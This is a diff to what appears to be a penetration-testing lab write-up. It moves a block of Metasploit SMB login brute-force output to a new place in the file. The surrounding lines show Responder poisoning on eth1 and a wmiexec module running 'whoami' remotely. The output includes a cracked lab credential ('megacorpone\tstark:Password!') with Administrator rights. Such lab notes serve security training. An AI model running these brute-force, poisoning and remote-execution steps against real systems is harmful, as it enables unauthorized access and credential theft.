@@ -25,18 +25,6 @@ Session completed
 ```
 
 ```
-msf6 auxiliary(scanner/smb/smb_login) > exploit
-
-[*] 172.22.117.20:445     - 172.22.117.20:445 - Starting SMB login bruteforce
-[+] 172.22.117.20:445     - 172.22.117.20:445 - Success: 'megacorpone\tstark:Password!' Administrator
-[!] 172.22.117.20:445     - No active DB -- Credential data will not be saved!
-[*] 172.22.117.20:445     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/smb/smb_login) >
-```
-
-
-```
 ┌──(root💀kali)-[~]
 └─# responder -I eth1 -v
                                          __
@@ -95,6 +83,18 @@ Session completed.
 ```
 
 ```
+
+```
+msf6 auxiliary(scanner/smb/smb_login) > exploit
+
+[*] 172.22.117.20:445     - 172.22.117.20:445 - Starting SMB login bruteforce
+[+] 172.22.117.20:445     - 172.22.117.20:445 - Success: 'megacorpone\tstark:Password!' Administrator
+[!] 172.22.117.20:445     - No active DB -- Credential data will not be saved!
+[*] 172.22.117.20:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_login) >
+```
+
 msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND whoami
 COMMAND => whoami
 msf6 auxiliary(scanner/smb/impacket/wmiexec) > run
